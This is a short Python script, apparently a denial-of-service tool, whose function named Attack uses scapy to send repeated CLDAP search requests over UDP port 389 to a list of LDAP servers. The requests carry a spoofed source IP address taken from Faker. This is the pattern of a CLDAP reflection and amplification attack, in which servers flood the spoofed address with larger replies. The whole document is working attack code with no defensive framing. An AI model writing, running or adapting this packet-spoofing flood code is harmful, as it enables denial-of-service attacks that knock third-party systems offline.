from scapy.all import IP, UDP, send, Raw
from scapy.layers.ldap import LDAP_SearchRequest 
from faker import Faker
import random

fake= Faker()
ldap_servers = ["10.0.0.1", "10.0.0.2"]
src_ip= fake.ipv4()
cldap_query = LDAP_SearchRequest(baseDN="", scope=0, deref=0, sizelimit=0, timelimit=0, typesonly=0, attributes=[])

def Attack(requestPerServer):
    for server in ldap_servers:
        ip = IP(src= src_ip, dst=server)
        for i in range(requestPerServer):
            src_port= random.randint(1024, 65535)
            udp = UDP(sport = src_port, dport=389)
            packet= ip/udp/Raw(load= bytes(cldap_query))
            send(packet, verbose=False)
            print(f"send {i} requests")
        pass
    pass